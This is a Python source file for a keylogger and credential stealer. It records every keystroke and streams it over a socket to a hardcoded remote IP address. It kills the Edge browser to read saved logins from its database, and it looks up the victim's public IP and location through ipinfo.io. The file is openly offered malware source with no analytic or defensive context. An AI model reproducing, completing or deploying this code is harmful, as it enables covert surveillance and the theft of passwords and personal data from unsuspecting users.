from pynput.keyboard import Listener
import socket
import os
import sqlite3
import requests
import json
import psutil
class Keylogger:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.client = None
    def host_info(self):
        name = socket.gethostname()
        priv_ip = socket.gethostbyname(name)
        pub_data = json.loads(requests.get("https://ipinfo.io").text)
        return f"host name is: {name}\nprivate ip is: {priv_ip}\npublic ip is: {pub_data['ip']}\nlived in: {pub_data['country']} {pub_data['city']}"
        
    def steal_pass(self):
        data = []
        path = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
        for process in psutil.process_iter(['pid', 'name']):
            if 'msedge.exe' in process.info['name'].lower():
                process.kill()
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            url = row[0]
            uname = row[1]
            password = row[2]
            if uname:
                data.append(f'webapp: {url} Username: {uname} Password: {password}')
        cursor.close()
        conn.close()
        return data

    def start_socket(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((self.ip, self.port))
        except socket.error as err:
            print(f"Socket creation error: {err}")

    def send_data(self, key):
        key = str(key).replace("'", "")
        try:
            self.client.send(key.encode('utf-8'))
        except socket.error as err:
            print(f"Failed to send data: {err}")

    def on_press(self, key):
        if str(key).find("Key.") == -1:
            self.send_data(key)
        else:
            self.send_data(f"special key {key}")

    def keylogger(self):
        self.start_socket()
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as err:
            print(f"Error in keyboard monitoring: {err}")
        finally:
            if self.client:
                self.client.close()
if __name__ == "__main__":
    ke = Keylogger("172.23.108.80", 9999)
    # ke.keylogger()
    # print(ke.steal_pass())
    # print(ke.host_info())
    print(ke.steal_pass())